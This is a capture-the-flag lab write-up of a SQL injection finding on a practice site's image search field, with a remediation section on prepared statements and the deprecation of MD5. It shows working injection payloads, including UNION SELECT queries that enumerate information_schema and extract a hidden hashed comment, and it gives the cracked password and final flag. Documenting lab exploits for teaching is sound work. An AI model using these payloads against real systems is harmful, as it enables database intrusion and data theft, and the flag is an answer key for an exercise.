# Finding 02 - SQL injection on image searching input field

## Exploitability
Easy. Only 2 steps required : inject code in input field, then decrypt md5 using easy-to-find web tool.

## Risk level/type
OWASP top 10 :
- A02:2021 – Cryptographic Failures
	=>" Are deprecated hash functions such as MD5 or SHA1 in use [...] ?"
- A03:2021 – Injection 					vulnerability to SQL injection

## Detailed description of the exploit
First check whether input field is protected against SQL injections by typing:
```1 or 1=1```
This yields 5 elements, seemingly from a SQL database. The last one being :

```
ID: 5 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
Checking the URL gives no result


Then, try more advanced SQL injection with the following two commands:
```1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables```
and
```1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns ```
The results are copied in database_table_schema and database_table_columns files.
At the bottom of each listing, there are fields that seem to be user-generated (the only few names not fully capitalized)
The names can be found in the database_listing.md file.

From this info, we try another SQL injection command :
```1 and 1=1 UNION SELECT url, title from Member_images.list_images```
which yields :
```
ID: 1 and 1=1 UNION SELECT url, title from Member_images.list_images 
First name: borntosec.ddns.net/images.png
Surname : Hack me ?
```

And one last SQL injection command :
```1 and 1=1 UNION SELECT id, comment from Member_images.list_images```
which yields :
```
ID: 1 and 1=1 UNION SELECT id, comment from Member_images.list_images 
First name: 5
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

This code seems to be hashed with md5, so let's try to decrypt it with the following website :
https://www.md5online.org/md5-decrypt.html

It works ! And yields the following :
albatroz
To encrypt it with sha256, we can use the command:
```echo -n "albatroz" | sha256sum```
The flag is:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Remediation

Input sanitizing is the first step.
There are several ways to sanitize the input, depending on the code architecture (legacy).
The first step is to use prepared statements with parameterized queries
	-> this means that the query would not be evaluated as a command but as a string, looking for an exact match to the string (i.e. a username matching "1 or 1 = 1")
For legacy code, you can also escape all the user input before putting it in a query.

Also, md5 is now deprecated in favor of sha2 algorithms (sha256, sha512) as well as sha3 algorithms.

## Additional resources
https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html

md5 deprecation notice :
https://www.security-database.com/detail.php?alert=VU836068